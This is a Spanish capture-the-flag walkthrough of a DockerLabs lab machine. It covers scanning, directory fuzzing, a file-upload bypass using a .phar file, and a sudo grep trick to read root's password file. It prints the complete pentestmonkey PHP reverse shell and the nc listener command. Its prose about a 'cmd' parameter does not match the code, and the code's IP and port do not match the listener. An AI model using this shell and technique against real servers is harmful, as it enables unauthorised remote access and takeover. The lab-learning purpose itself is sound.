Maquina: DockerLabs

Autor: El Pinguino de Mario

Dificultad: Facil

![Captura de pantalla 2024-12-21 175306](https://github.com/user-attachments/assets/a8fc8213-b60f-4290-b14e-a1a53916d91c)

ping 172.17.0.2 -c 1

![Captura de pantalla 2024-12-21 175339](https://github.com/user-attachments/assets/90787601-be3a-4d6a-aded-55e8b9e2c11b)

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

![Captura de pantalla 2024-12-21 175432](https://github.com/user-attachments/assets/b7be60f6-63c2-49fd-b200-77ada5b1d11e)

Accederemos a la página web

172.17.0.2

![Captura de pantalla 2024-12-21 175504](https://github.com/user-attachments/assets/06e1f124-7c79-4f8a-adea-2b3403a39f00)

Aplicar Fuzzing para descubrir rutas y archivos con extensiones

gobuster dir -t 150 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

![Captura de pantalla 2024-12-21 180019](https://github.com/user-attachments/assets/6a179ae2-fbb5-4608-b5d6-d044856556e1)

Accedemos al archivo machine.php y descubrimos una página web que permite la subida de archivos

![Captura de pantalla 2024-12-21 180540](https://github.com/user-attachments/assets/b24893ca-07d9-4672-b973-2f8d07dcf121)

Intentamos subir un archivo que contenga código PHP para ejecutar comandos a nivel del sistema

![Captura de pantalla 2024-12-21 180617](https://github.com/user-attachments/assets/67038c76-7f51-40ce-b5e6-5417c6673727)

Creamos un archivo llamado pwned.phar que incluye el siguiente código, lo cual nos permite ejecutar comandos del sistema al enviar un parámetro llamado cmd

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 


![Captura de pantalla 2024-12-21 181241](https://github.com/user-attachments/assets/d48255af-431b-4bbb-8ea7-1d2c5f965b0e)

Subimos el archivo .phar y confirmaremos que se ha cargado correctamente

172.17.0.2/upload.php

Ahora, necesitamos enviar una shell inversa a nuestra máquina atacante

En nuestra máquina atacante, nos ponemos a la escucha con Netcat en el puerto 443 utilizando el siguiente comando:

nc -nvlp 443

hacemos click en el archivo para abrirlo

Al ejecutar esto, obtendremos una shell inversa en nuestra máquina atacante. Así, estaremos dentro del sistema

Al ejecutar sudo -l, veremos que podemos ejecutar los binarios /usr/bin/cut y /usr/bin/grep como usuario root sin necesidad de proporcionar una contraseña

![Captura de pantalla 2024-12-21 181544](https://github.com/user-attachments/assets/df492902-a68b-4240-b039-e6230db4720d)

Si realizamos una búsqueda de archivos .txt en el sistema utilizando el comando:

find / *.txt 2>/dev/null

veremos que hay un archivo en /opt/ llamado nota.txt

Al revisar el contenido de ese archivo, encontramos el siguiente mensaje:

Protege la clave de root, se encuentra en su directorio /root/clave.txt. Menos mal que nadie tiene permisos para acceder a ella

tenemos permisos para ejecutar los binarios grep y cut. Aprovecharemos estos permisos para leer el archivo /root/clave.txt de la siguiente manera:

![Captura de pantalla 2024-12-21 181646](https://github.com/user-attachments/assets/35c5c359-1470-40a2-9bcc-cf7ccc59ff19)

sudo grep '' /root/clave.txt

![Captura de pantalla 2024-12-21 181724](https://github.com/user-attachments/assets/2ece230f-d4a2-4bcd-badc-56087964e254)

Leemos el archivo, encontramos una posible contraseña: dockerlabsmolamogollon123.

Cambiamos al usuario root y utilizamos la contraseña encontrada

whoami
